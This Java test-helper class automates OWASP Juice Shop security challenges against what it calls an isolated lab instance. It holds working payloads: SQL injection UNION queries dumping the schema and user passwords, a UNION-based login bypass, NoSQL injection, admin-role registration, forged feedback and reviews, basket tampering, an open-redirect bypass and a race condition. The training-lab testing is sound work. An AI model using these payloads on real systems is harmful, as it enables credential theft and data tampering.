
package utilities.JuiceShop;

import org.openqa.selenium.By;
import org.openqa.selenium.Keys;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.WebElement;
import org.openqa.selenium.json.Json;
import org.openqa.selenium.support.ui.ExpectedConditions;
import org.openqa.selenium.support.ui.WebDriverWait;

import java.io.IOException;
import java.net.URLEncoder;
import java.net.http.HttpResponse;
import java.nio.charset.StandardCharsets;
import java.time.Duration;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Map;
import java.util.concurrent.CompletableFuture;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;

import static java.net.HttpURLConnection.HTTP_CREATED;
import static java.net.HttpURLConnection.HTTP_OK;

/**
 * Groups application-level HTTP actions used by challenge tests while leaving assertions to the tests.
 */
public final class JuiceShopChallengeActions {

    private final JuiceShopApi api;
    private final Json json = new Json();

    public record BasketAttempt(int ownBasketId, int targetBasketId, HttpResponse<String> response) {}
    public record FeedbackAttempt(int authenticatedUserId, int forgedUserId, HttpResponse<String> response) {}
    public record FeedbackRemoval(int deletedCount, HttpResponse<String> response, boolean fiveStarsRemain) {}

    /**
     * Creates the juice shop challenge actions component and initializes the dependencies required by its methods.
     *
     * <p>Creates a collection of Juice Shop challenge actions using the supplied API client.</p>
     *
     * @param api the Juice Shop HTTP helper used to send API requests
     */
    public JuiceShopChallengeActions(JuiceShopApi api) { this.api = api; }

    /**
     * Performs the register with mismatched passwords action against the isolated Juice Shop test application.
     *
     * <p>Uses the Juice Shop endpoint {@code /api/Users/}.</p>
     *
     * @return the HTTP response containing the status code, headers, and response body from the requested endpoint
     * @throws IOException if a required file or HTTP stream cannot be read or written
     * @throws InterruptedException if the current thread is interrupted while waiting for the operation
     */
    public HttpResponse<String> registerWithMismatchedPasswords() throws IOException, InterruptedException {
        String email = "registration-" + System.nanoTime() + "@example.com";
        return api.post("/api/Users/", Map.of("email", email, "password", "Password123!", "passwordRepeat", "Different123!"));
    }

    /**
     * Performs the register empty user action against the isolated Juice Shop test application.
     *
     * <p>Uses the Juice Shop endpoint {@code /api/Users/}.</p>
     *
     * @return the HTTP response containing the status code, headers, and response body from the requested endpoint
     * @throws IOException if a required file or HTTP stream cannot be read or written
     * @throws InterruptedException if the current thread is interrupted while waiting for the operation
     */
    public HttpResponse<String> registerEmptyUser() throws IOException, InterruptedException {
        return api.post("/api/Users/", Map.of("email", "", "password", "", "passwordRepeat", ""));
    }

    /**
     * Performs the view another basket action against the isolated Juice Shop test application.
     *
     * <p>Uses the Juice Shop endpoint {@code /rest/basket/}.</p>
     *
     * @return the request status and basket identifiers describing the access attempt
     * @throws IOException if a required file or HTTP stream cannot be read or written
     * @throws InterruptedException if the current thread is interrupted while waiting for the operation
     */
    public BasketAttempt viewAnotherBasket() throws IOException, InterruptedException {
        var session = api.login();
        int targetBasketId = session.basketId() == 1 ? 2 : 1;
        return new BasketAttempt(session.basketId(), targetBasketId,
                api.get("/rest/basket/" + targetBasketId, session.token()));
    }

    /**
     * Performs the add products to another basket action against the isolated Juice Shop test application.
     *
     * <p>Uses the Juice Shop endpoint {@code /rest/basket/}, {@code /api/Products/}.</p>
     *
     * @return the HTTP response containing the status code, headers, and response body from the requested endpoint
     * @throws IOException if a required file or HTTP stream cannot be read or written
     * @throws InterruptedException if the current thread is interrupted while waiting for the operation
     */
    @SuppressWarnings("unchecked")
    public HttpResponse<String> addProductsToAnotherBasket() throws IOException, InterruptedException {
        var session = api.login();
        int targetBasketId = session.basketId() == 1 ? 2 : 1;

        var basketResponse = api.get("/rest/basket/" + targetBasketId, session.token());
        if (basketResponse.statusCode() != HTTP_OK)
            throw new IllegalStateException("Target basket HTTP " + basketResponse.statusCode());

        var productsResponse = api.get("/api/Products/", session.token());
        if (productsResponse.statusCode() != HTTP_OK)
            throw new IllegalStateException("Products HTTP " + productsResponse.statusCode());

        Map<String, Object> catalog = json.toType(productsResponse.body(), Map.class);
        if (!(catalog.get("data") instanceof List<?> products) || products.isEmpty())
            throw new IllegalStateException("No products available.");

        Map<String, Object> basketData = json.toType(basketResponse.body(), Map.class);
        Object basket = basketData.get("data");
        List<?> existing = basket instanceof Map<?, ?> b && b.get("Products") instanceof List<?> items
                ? items : List.of();

        int productId = -1;
        for (Object item : products) {
            if (!(item instanceof Map<?, ?> product) || !(product.get("id") instanceof Number id)) continue;
            boolean alreadyPresent = existing.stream().anyMatch(entry ->
                    entry instanceof Map<?, ?> p && p.get("id") instanceof Number existingId
                            && existingId.intValue() == id.intValue());
            if (!alreadyPresent) {
                productId = id.intValue();
                break;
            }
        }
        if (productId == -1) throw new IllegalStateException("No unused product available for target basket.");

        String body = "{\"ProductId\":" + productId
                + ",\"BasketId\":\"" + session.basketId()
                + "\",\"quantity\":1,\"BasketId\":\"" + targetBasketId + "\"}";

        var response = api.sendApi("POST", "/api/BasketItems/", body, session.token());
        if (response.statusCode() != HTTP_OK && response.statusCode() != HTTP_CREATED)
            throw new IllegalStateException("Basket manipulation HTTP " + response.statusCode() + " " + response.body());

        return response;
    }

    /**
     * Performs the add product to another basket action against the isolated Juice Shop test application.
     *
     * @return the HTTP response containing the status code, headers, and response body from the requested endpoint
     * @throws IOException if a required file or HTTP stream cannot be read or written
     * @throws InterruptedException if the current thread is interrupted while waiting for the operation
     */
    public HttpResponse<String> addProductToAnotherBasket() throws IOException, InterruptedException {
        return addProductsToAnotherBasket();
    }

    /**
     * Performs the submit forged feedback action against the isolated Juice Shop test application.
     *
     * <p>Uses the Juice Shop endpoint {@code /api/Feedbacks/}.</p>
     *
     * @return the authenticated and forged user IDs together with the feedback response
     * @throws IOException if a required file or HTTP stream cannot be read or written
     * @throws InterruptedException if the current thread is interrupted while waiting for the operation
     */
    @SuppressWarnings("unchecked")
    public FeedbackAttempt submitForgedFeedback() throws IOException, InterruptedException {
        var session = api.login();
        Map<String, Object> captcha = captcha();
        int forgedUserId = session.userId() == 1 ? 2 : 1;
        Map<String, Object> payload = Map.of(
                "UserId", forgedUserId, "comment", "Automated authorization test", "rating", 1,
                "captchaId", ((Number) captcha.get("captchaId")).intValue(),
                "captcha", String.valueOf(captcha.get("answer")));
        return new FeedbackAttempt(session.userId(), forgedUserId,
                api.post("/api/Feedbacks/", payload, session.token()));
    }

    /**
     * Performs the remove five star feedback action against the isolated Juice Shop test application.
     *
     * <p>Uses the Juice Shop endpoint {@code /api/Feedbacks/}.</p>
     *
     * @return the feedback deletion response and metadata describing the removed record
     * @throws IOException if a required file or HTTP stream cannot be read or written
     * @throws InterruptedException if the current thread is interrupted while waiting for the operation
     */
    public FeedbackRemoval removeFiveStarFeedback() throws IOException, InterruptedException {
        var session = api.login();
        var initial = api.get("/api/Feedbacks/", session.token());
        if (initial.statusCode() != 200) throw new IllegalStateException("Feedback HTTP " + initial.statusCode());
        int removed = 0;
        for (Map<String, Object> feedback : api.getFeedbackRecords(initial.body())) {
            if (((Number) feedback.get("rating")).intValue() != 5) continue;
            int id = ((Number) feedback.get("id")).intValue();
            var result = api.delete("/api/Feedbacks/" + id, session.token());
            if (result.statusCode() != 200 && result.statusCode() != 204)
                throw new IllegalStateException("Delete feedback " + id + ": HTTP " + result.statusCode());
            removed++;
        }
        var remaining = api.get("/api/Feedbacks/", session.token());
        if (remaining.statusCode() != 200) throw new IllegalStateException("Feedback HTTP " + remaining.statusCode());
        boolean fiveStarsRemain = api.getFeedbackRecords(remaining.body()).stream()
                .anyMatch(f -> ((Number) f.get("rating")).intValue() == 5);
        return new FeedbackRemoval(removed, remaining, fiveStarsRemain);
    }

    /**
     * Performs the register with admin role action against the isolated Juice Shop test application.
     *
     * <p>Uses the Juice Shop endpoint {@code /api/Users/}.</p>
     *
     * @return the HTTP response containing the status code, headers, and response body from the requested endpoint
     * @throws IOException if a required file or HTTP stream cannot be read or written
     * @throws InterruptedException if the current thread is interrupted while waiting for the operation
     */
    public HttpResponse<String> registerWithAdminRole() throws IOException, InterruptedException {
        return api.post("/api/Users/", Map.of("email", "admin-registration-" + System.nanoTime() + "@example.com",
                "password", "Password123!", "passwordRepeat", "Password123!", "role", "admin"));
    }

    /**
     * Performs the submit zero star feedback action against the isolated Juice Shop test application.
     *
     * @return the HTTP response containing the status code, headers, and response body from the requested endpoint
     * @throws IOException if a required file or HTTP stream cannot be read or written
     * @throws InterruptedException if the current thread is interrupted while waiting for the operation
     */
    public HttpResponse<String> submitZeroStarFeedback() throws IOException, InterruptedException {
        return submitFeedback("Automated zero-star feedback validation", 0);
    }

    /**
     * Performs the submit forged product review action against the isolated Juice Shop test application.
     *
     * <p>Uses the Juice Shop endpoint {@code /rest/products/1/reviews}.</p>
     *
     * @return the HTTP response containing the status code, headers, and response body from the requested endpoint
     * @throws IOException if a required file or HTTP stream cannot be read or written
     * @throws InterruptedException if the current thread is interrupted while waiting for the operation
     */
    public HttpResponse<String> submitForgedProductReview() throws IOException, InterruptedException {
        var session = api.login();
        return api.put("/rest/products/1/reviews", Map.of("author", "bender@juice-sh.op",
                "message", "Automated review authorization verification"), session.token());
    }

    /**
     * Performs the submit crypto complaint action against the isolated Juice Shop test application.
     *
     * @return the HTTP response containing the status code, headers, and response body from the requested endpoint
     * @throws IOException if a required file or HTTP stream cannot be read or written
     * @throws InterruptedException if the current thread is interrupted while waiting for the operation
     */
    public HttpResponse<String> submitCryptoComplaint() throws IOException, InterruptedException {
        return submitFeedback("The MD5 hashing algorithm should not be used for password storage.");
    }

    /**
     * Performs the submit vulnerable library complaint action against the isolated Juice Shop test application.
     *
     * @return the HTTP response containing the status code, headers, and response body from the requested endpoint
     * @throws IOException if a required file or HTTP stream cannot be read or written
     * @throws InterruptedException if the current thread is interrupted while waiting for the operation
     */
    public HttpResponse<String> submitVulnerableLibraryComplaint() throws IOException, InterruptedException {
        return submitFeedback("sanitize-html 1.4.2 is a vulnerable dependency.");
    }

    /**
     * Polls challenge progress until the named Juice Shop challenge is recorded as solved.
     *
     * <p>Polls the challenge status before failing with an error if completion is not observed within the fixed retry count.</p>
     *
     * @param challengeName the Score Board name of the Juice Shop challenge to inspect
     * @throws IOException if a required file or HTTP stream cannot be read or written
     * @throws InterruptedException if the current thread is interrupted while waiting for the operation
     */
    public void waitForChallenge(String challengeName) throws IOException, InterruptedException {
        for (int i = 0; i < 20; i++) {
            if (api.isChallengeSolved(challengeName)) return;
            Thread.sleep(200);
        }
        throw new IllegalStateException("Challenge not completed: " + challengeName);
    }

    /**
     * Performs the retrieve nested easter egg action against the isolated Juice Shop test application.
     *
     * <p>Uses the Juice Shop endpoint {@code /the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg}.</p>
     *
     * @return the HTTP response containing the status code, headers, and response body from the requested endpoint
     * @throws IOException if a required file or HTTP stream cannot be read or written
     * @throws InterruptedException if the current thread is interrupted while waiting for the operation
     */
    public HttpResponse<String> retrieveNestedEasterEgg() throws IOException, InterruptedException {
        return api.get("/the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg");
    }

    /**
     * Performs the retrieve blueprint action against the isolated Juice Shop test application.
     *
     * <p>Uses the Juice Shop endpoint {@code /assets/public/images/products/JuiceShop.stl}.</p>
     *
     * @return the HTTP response containing the status code, headers, and response body from the requested endpoint
     * @throws IOException if a required file or HTTP stream cannot be read or written
     * @throws InterruptedException if the current thread is interrupted while waiting for the operation
     */
    public HttpResponse<String> retrieveBlueprint() throws IOException, InterruptedException {
        return api.get("/assets/public/images/products/JuiceShop.stl");
    }

    /**
     * Performs the open premium page action against the isolated Juice Shop test application.
     *
     * <p>Uses the Juice Shop endpoint {@code /this/page/is/hidden/behind/an/incredibly/high/paywall/that/could/only/be/unlocked/by/sending/1btc/to/us}.</p>
     *
     * @return the HTTP response containing the status code, headers, and response body from the requested endpoint
     * @throws IOException if a required file or HTTP stream cannot be read or written
     * @throws InterruptedException if the current thread is interrupted while waiting for the operation
     */
    public HttpResponse<String> openPremiumPage() throws IOException, InterruptedException {
        return api.get("/this/page/is/hidden/behind/an/incredibly/high/paywall/that/could/only/be/unlocked/by/sending/1btc/to/us");
    }

    /**
     * Performs the apply imaginary continue code action against the isolated Juice Shop test application.
     *
     * @return the HTTP response containing the status code, headers, and response body from the requested endpoint
     * @throws IOException if a required file or HTTP stream cannot be read or written
     * @throws InterruptedException if the current thread is interrupted while waiting for the operation
     */
    public HttpResponse<String> applyImaginaryContinueCode() throws IOException, InterruptedException {
        return api.sendApi("PUT", "/rest/continue-code/apply/69OxrZ8aJEgxONZyWoz1Dw4BvXmRGkM6Ae9M7k2rK63YpqQLPjnlb5V5LvDj", null, null);
    }

    /**
     * Performs the bypass redirect allowlist action against the isolated Juice Shop test application.
     *
     * <p>Uses the Juice Shop endpoint {@code /redirect?to=http://kimminich.de?pwned=https://github.com/juice-shop/juice-shop}.</p>
     *
     * @return the HTTP response containing the status code, headers, and response body from the requested endpoint
     * @throws IOException if a required file or HTTP stream cannot be read or written
     * @throws InterruptedException if the current thread is interrupted while waiting for the operation
     */
    public HttpResponse<String> bypassRedirectAllowlist() throws IOException, InterruptedException {
        return api.get("/redirect?to=http://kimminich.de?pwned=https://github.com/juice-shop/juice-shop");
    }

    /**
     * Performs the submit feedback action against the isolated Juice Shop test application.
     *
     * @param comment the text placed in a feedback submission
     * @return the HTTP response containing the status code, headers, and response body from the requested endpoint
     * @throws IOException if a required file or HTTP stream cannot be read or written
     * @throws InterruptedException if the current thread is interrupted while waiting for the operation
     */
    public HttpResponse<String> submitFeedback(String comment) throws IOException, InterruptedException {
        return submitFeedback(comment, 1);
    }

    /**
     * Performs the submit feedback action against the isolated Juice Shop test application.
     *
     * <p>Uses the Juice Shop endpoint {@code /api/Feedbacks/}.</p>
     *
     * @param comment the text placed in a feedback submission
     * @param rating the star rating included in the feedback
     * @return the HTTP response containing the status code, headers, and response body from the requested endpoint
     * @throws IOException if a required file or HTTP stream cannot be read or written
     * @throws InterruptedException if the current thread is interrupted while waiting for the operation
     */
    public HttpResponse<String> submitFeedback(String comment, int rating) throws IOException, InterruptedException {
        Map<String, Object> captcha = captcha();
        var response = api.post("/api/Feedbacks/", Map.of("comment", comment, "rating", rating,
                "captchaId", ((Number) captcha.get("captchaId")).intValue(),
                "captcha", String.valueOf(captcha.get("answer"))));
        if (response.statusCode() != 201 && response.statusCode() != 200)
            throw new IllegalStateException("Feedback not accepted: HTTP " + response.statusCode() + " " + response.body());
        return response;
    }

    /**
     * Performs the tamper with product description action against the isolated Juice Shop test application.
     *
     * <p>Uses the Juice Shop endpoint {@code /api/Products/9}.</p>
     *
     * @return the HTTP response containing the status code, headers, and response body from the requested endpoint
     * @throws IOException if a required file or HTTP stream cannot be read or written
     * @throws InterruptedException if the current thread is interrupted while waiting for the operation
     */
    public HttpResponse<String> tamperWithProductDescription() throws IOException, InterruptedException {
        var session = api.login();
        return api.put("/api/Products/9", Map.of("description", "<a href=\"https://owasp.slack.com\" target=\"_blank\">More...</a>"), session.token());
    }

    /**
     * Performs the update all reviews via no SQL action against the isolated Juice Shop test application.
     *
     * @return the HTTP response containing the status code, headers, and response body from the requested endpoint
     * @throws IOException if a required file or HTTP stream cannot be read or written
     * @throws InterruptedException if the current thread is interrupted while waiting for the operation
     */
    public HttpResponse<String> updateAllReviewsViaNoSql() throws IOException, InterruptedException {
        var session = api.login();
        String body = json.toJson(Map.of("id", Map.of("$ne", -1), "message", "NoSQL Injection!"));
        return api.sendApi("PATCH", "/rest/products/reviews", body, session.token());
    }


    /**
     * Performs the retrieve database schema action against the isolated Juice Shop test application.
     *
     * @return the HTTP response containing the status code, headers, and response body from the requested endpoint
     * @throws IOException if a required file or HTTP stream cannot be read or written
     * @throws InterruptedException if the current thread is interrupted while waiting for the operation
     */
    public HttpResponse<String> retrieveDatabaseSchema() throws IOException, InterruptedException {
        return searchWithUnion("sqlite_master", "sql", "'2'", "'3'");
    }

    /**
     * Performs the search with union action against the isolated Juice Shop test application.
     *
     * <p>Uses the Juice Shop endpoint {@code /rest/products/search?q=}.</p>
     *
     * @param table the database table included in the lab-only UNION query
     * @param first the expression selected as the first result column
     * @param second the expression selected as the second result column
     * @param third the expression selected as the third result column
     * @return the HTTP response containing the status code, headers, and response body from the requested endpoint
     * @throws IOException if a required file or HTTP stream cannot be read or written
     * @throws InterruptedException if the current thread is interrupted while waiting for the operation
     */
    private HttpResponse<String> searchWithUnion(String table, String first, String second, String third)
            throws IOException, InterruptedException {
        List<String> columns = new ArrayList<>(List.of(first, second, third));
        for (int i = 4; i <= 10; i++) columns.add("'" + i + "'");

        String query = "qwert')) UNION SELECT " + String.join(",", columns) + " FROM " + table + "--";
        var response = api.get("/rest/products/search?q=" + encode(query));

        if (response.statusCode() != HTTP_OK)
            throw new IllegalStateException("Union query failed: HTTP " + response.statusCode() + " " + response.body());

        return response;
    }


    /**
     * Performs the retrieve user credentials action against the isolated Juice Shop test application.
     *
     * @return the HTTP response containing the status code, headers, and response body from the requested endpoint
     * @throws IOException if a required file or HTTP stream cannot be read or written
     * @throws InterruptedException if the current thread is interrupted while waiting for the operation
     */
    public HttpResponse<String> retrieveUserCredentials() throws IOException, InterruptedException {
        return searchWithUnion("Users", "id", "email", "password");
    }


    /**
     * Performs the exfiltrate orders via no SQL action against the isolated Juice Shop test application.
     *
     * <p>Uses the Juice Shop endpoint {@code /rest/track-order/}.</p>
     *
     * @return the HTTP response containing the status code, headers, and response body from the requested endpoint
     * @throws IOException if a required file or HTTP stream cannot be read or written
     * @throws InterruptedException if the current thread is interrupted while waiting for the operation
     */
    public HttpResponse<String> exfiltrateOrdersViaNoSql() throws IOException, InterruptedException {
        return api.get("/rest/track-order/" + encode("' || true || '"));
    }

    /**
     * Performs the submit rapid feedback action against the isolated Juice Shop test application.
     *
     * <p>Uses the Juice Shop endpoint {@code /api/Feedbacks/}.</p>
     *
     * @param count the requested number of actions or items
     * @return the HTTP response containing the status code, headers, and response body from the requested endpoint
     * @throws IOException if a required file or HTTP stream cannot be read or written
     * @throws InterruptedException if the current thread is interrupted while waiting for the operation
     */
    public HttpResponse<String> submitRapidFeedback(int count) throws IOException, InterruptedException {
        if (count < 10) throw new IllegalArgumentException("At least ten feedback submissions are required.");
        Map<String, Object> c = captcha();
        Map<String, Object> answer = Map.of("rating", 1,
                "captchaId", ((Number) c.get("captchaId")).intValue(),
                "captcha", String.valueOf(c.get("answer")));
        HttpResponse<String> last = null;
        long started = System.nanoTime();
        for (int i = 0; i < count; i++) {
            last = api.post("/api/Feedbacks/", Map.of("comment", "CAPTCHA repeat " + i,
                    "rating", answer.get("rating"), "captchaId", answer.get("captchaId"), "captcha", answer.get("captcha")));
            if (last.statusCode() != 201 && last.statusCode() != 200)
                throw new IllegalStateException("Feedback #" + i + " HTTP " + last.statusCode());
        }
        System.out.printf("[CAPTCHA] Submitted %d feedbacks in %.2f seconds%n", count, (System.nanoTime() - started) / 1e9);
        return last;
    }

    /**
     * Performs the like review concurrently action against the isolated Juice Shop test application.
     *
     * <p>Uses the Juice Shop endpoint {@code /rest/products/1/reviews}, {@code /rest/products/reviews}.</p>
     *
     * @return the HTTP responses from the concurrent review-like requests
     * @throws Exception if a browser, HTTP, container, or scanner operation fails
     */
    @SuppressWarnings("unchecked")
    public List<HttpResponse<String>> likeReviewConcurrently() throws Exception {
        var session = api.login();
        var reviewResponse = api.get("/rest/products/1/reviews", session.token());
        if (reviewResponse.statusCode() != 200) throw new IllegalStateException("Could not retrieve reviews.");
        Object parsed = json.toType(reviewResponse.body(), Map.class);
        Object raw = ((Map<String, Object>) parsed).get("data");
        if (!(raw instanceof List<?> reviews) || reviews.isEmpty())
            throw new IllegalStateException("No review available to like.");
        Object id = ((Map<String, Object>) reviews.get(0)).get("_id");
        if (id == null) throw new IllegalStateException("Review ID missing.");

        CountDownLatch release = new CountDownLatch(1);
        List<CompletableFuture<HttpResponse<String>>> futures = new ArrayList<>();
        for (int i = 0; i < 3; i++) {
            futures.add(CompletableFuture.supplyAsync(() -> {
                try {
                    if (!release.await(5, TimeUnit.SECONDS)) throw new IllegalStateException("Like barrier timed out.");
                    return api.post("/rest/products/reviews", Map.of("id", id), session.token());
                } catch (Exception e) { throw new RuntimeException(e); }
            }));
        }
        release.countDown();
        List<HttpResponse<String>> responses = new ArrayList<>();
        for (var future : futures) responses.add(future.get(20, TimeUnit.SECONDS));
        return responses;
    }

    /**
     * Performs the upload unexpected file type action against the isolated Juice Shop test application.
     *
     * <p>Uses the Juice Shop endpoint {@code /file-upload}.</p>
     *
     * @return the HTTP response containing the status code, headers, and response body from the requested endpoint
     * @throws IOException if a required file or HTTP stream cannot be read or written
     * @throws InterruptedException if the current thread is interrupted while waiting for the operation
     */
    public HttpResponse<String> uploadUnexpectedFileType() throws IOException, InterruptedException {
        return api.uploadMultipart("/file-upload", "audit.txt", "text/plain",
                "Juice Shop unexpected file type check".getBytes(StandardCharsets.UTF_8), null);
    }

    /**
     * Performs the upload oversized PDF action against the isolated Juice Shop test application.
     *
     * <p>Uses the Juice Shop endpoint {@code /file-upload}.</p>
     *
     * @return the HTTP response containing the status code, headers, and response body from the requested endpoint
     * @throws IOException if a required file or HTTP stream cannot be read or written
     * @throws InterruptedException if the current thread is interrupted while waiting for the operation
     */
    public HttpResponse<String> uploadOversizedPdf() throws IOException, InterruptedException {
        byte[] bytes = new byte[120_000];
        Arrays.fill(bytes, (byte) 'A');
        byte[] header = "%PDF-1.4\n".getBytes(StandardCharsets.UTF_8);
        System.arraycopy(header, 0, bytes, 0, header.length);
        return api.uploadMultipart("/file-upload", "test.pdf", "application/pdf", bytes, null);
    }

    /**
     * Performs the use deprecated XML upload action against the isolated Juice Shop test application.
     *
     * <p>Uses the Juice Shop endpoint {@code /file-upload}.</p>
     *
     * @return the HTTP response containing the status code, headers, and response body from the requested endpoint
     * @throws IOException if a required file or HTTP stream cannot be read or written
     * @throws InterruptedException if the current thread is interrupted while waiting for the operation
     */
    public HttpResponse<String> useDeprecatedXmlUpload() throws IOException, InterruptedException {
        var session = api.login();
        return api.uploadMultipart("/file-upload", "invoice.xml", "application/xml",
                "<?xml version=\"1.0\"?><invoice><id>1</id></invoice>".getBytes(StandardCharsets.UTF_8), session.token());
    }

    /**
     * Performs the dismiss challenge notifications action against the isolated Juice Shop test application.
     *
     * @param driver the Selenium WebDriver controlling the application browser
     */
    public void dismissChallengeNotifications(WebDriver driver) {
        By notifications = By.cssSelector(
                "app-challenge-solved-notification .challenge-solved-toast mat-card.accent-notification");

        WebDriverWait wait = new WebDriverWait(driver, Duration.ofSeconds(15));
        wait.withMessage("Mass Dispel requires at least two visible Challenge solved notifications.");
        wait.until(d -> d.findElements(notifications).stream()
                .filter(WebElement::isDisplayed).count() >= 2);

        long count = driver.findElements(notifications).stream()
                .filter(WebElement::isDisplayed).count();

        By closeButton = By.cssSelector(
                "app-challenge-solved-notification .challenge-solved-toast button#closeButton");

        WebElement button = wait.until(ExpectedConditions.elementToBeClickable(closeButton));

        new org.openqa.selenium.interactions.Actions(driver)
                .keyDown(Keys.SHIFT).click(button).keyUp(Keys.SHIFT).perform();

        System.out.println("[MASS DISPEL] Shift-clicked X with "
                + count + " challenge notifications visible.");
    }

    /**
     * Builds the cross-site imaging URL used in the corresponding Juice Shop challenge.
     *
     * @param baseUrl the base URL of the containerized application under test
     * @return the URL constructed for the Cross-Site Imaging challenge
     */
    public String crossSiteImagingUrl(String baseUrl) {
        String target = "../../../../redirect?to=https://cataas.com/cat"
                + "?x=https://github.com/juice-shop/juice-shop";
        return baseUrl + "/#/deluxe-membership?testDecal=" + encode(target);
    }

    /**
     * Performs the ephemeral accountant login flow and returns the relevant credential or token.
     *
     * @return the login result associated with the ephemeral accountant challenge
     */
    public String ephemeralAccountantLogin() {
        return "' UNION SELECT * FROM (SELECT 15 as 'id', '' as 'username', "
                + "'acc0unt4nt@juice-sh.op' as 'email', '12345' as 'password', "
                + "'accounting' as 'role', '123' as 'deluxeToken', '1.2.3.4' as 'lastLoginIp', "
                + "'/assets/public/images/uploads/default.svg' as 'profileImage', "
                + "'' as 'totpSecret', 1 as 'isActive', "
                + "'1999-08-16 14:14:41.644 +00:00' as 'createdAt', "
                + "'1999-08-16 14:33:41.930 +00:00' as 'updatedAt', null as 'deletedAt')--";
    }

    /**
     * Requests and parses the captcha challenge used by feedback actions.
     *
     * <p>Uses the Juice Shop endpoint {@code /rest/captcha/}.</p>
     *
     * @return the challenge CAPTCHA identifier and answer data
     * @throws IOException if a required file or HTTP stream cannot be read or written
     * @throws InterruptedException if the current thread is interrupted while waiting for the operation
     */
    @SuppressWarnings("unchecked")
    private Map<String, Object> captcha() throws IOException, InterruptedException {
        var result = api.get("/rest/captcha/");
        if (result.statusCode() != 200) throw new IllegalStateException("CAPTCHA HTTP " + result.statusCode());
        return json.toType(result.body(), Map.class);
    }

    /**
     * URL-encodes a value for use in an application request.
     *
     * @param s the string that will be URL-encoded
     * @return percent-encoded query text suitable for a Juice Shop URL
     */
    private String encode(String s) { return URLEncoder.encode(s, StandardCharsets.UTF_8).replace("+", "%20"); }
}
